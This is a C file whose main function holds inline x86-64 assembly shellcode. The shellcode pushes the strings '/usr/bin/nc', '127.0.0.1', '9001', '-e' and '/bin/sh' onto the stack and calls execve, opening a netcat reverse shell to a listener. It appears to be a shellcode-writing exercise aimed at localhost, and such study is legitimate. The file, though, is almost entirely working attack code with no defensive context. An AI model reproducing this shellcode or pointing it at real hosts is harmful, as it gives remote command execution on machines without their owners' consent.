#include <stdlib.h>

// execve system call number : 59
// const char *filename : %rdi
// const char *const argv : %rsi
// const char *const envp : %rdx

int main() {
    __asm(
        "xor %rcx, %rcx\n"                      // null byte

        "push %rcx\n"                           // put termination of filename

        // 1. set "/usr/bin/nc"
        "mov $0x636e2f6e69622f72, %rbx\n"        // put "r/bin/nc" on stack
        "push %rbx\n"

        "mov $0x73752f2f, %ebx\n"                // put "//us" on 4b register
        "sub $0x4, %rsp\n"                       // allocate 4 bytes on the stack
        "mov %ebx, (%rsp)\n"                     // push into stack, now stack contains "//usr/bin/nc"

        "mov %rsp, %rdi\n"                      // set filename argument

        // 2. set empty envp
        "push %rcx\n"                           // allocate memory for envp array
        "mov %rsp, %rdx\n"                      // set envp

        // 3. set argument array

        // port
        "mov $0x31303039, %rbx\n"               // put port 9001
        "push %rbx\n"
        "push %rcx\n"                           // finish with null byte
        
        // address
        "mov $0x312e302e302e3732, %rbx\n"       // put "27.0.0.1"
        "push %rbx\n"
        
        "sub $0x1, %rsp\n"                      // allocate memory for remaining char
        "mov $0x31, %bl\n"                      // put missing "1" of address
        "mov %bl, (%rsp)\n"
        "push %rcx\n"

        // spawn shell after connect
        "mov $0x68732f6e69622f, %rbx\n"         // put "/bin/sh"
        "push %rbx\n"
        "push %rcx\n"                          
        
        "mov $0x652d, %rbx\n"                   // put "-e"
        "push %rbx\n"
        "push %rcx\n"

        "lea -0x24(%rbp), %rbx\n"               // address of port
        "push %rbx\n"

        "lea -0x35(%rbp), %rbx\n"               // address of ip
        "push %rbx\n"

        "lea -0x45(%rbp), %rbx\n"               // address of shell
        "push %rbx\n"
        
        "lea -0x55(%rbp), %rbx\n"               // address of "-e" option
        "push %rbx\n"

        "push %rdi\n"                           // filename address
        "mov %rsp, %rsi\n"                      // set argv

        "push $0x3b\n"                          // set execve syscall number
        "pop %rax\n"
        "syscall\n"                             // call
    );
}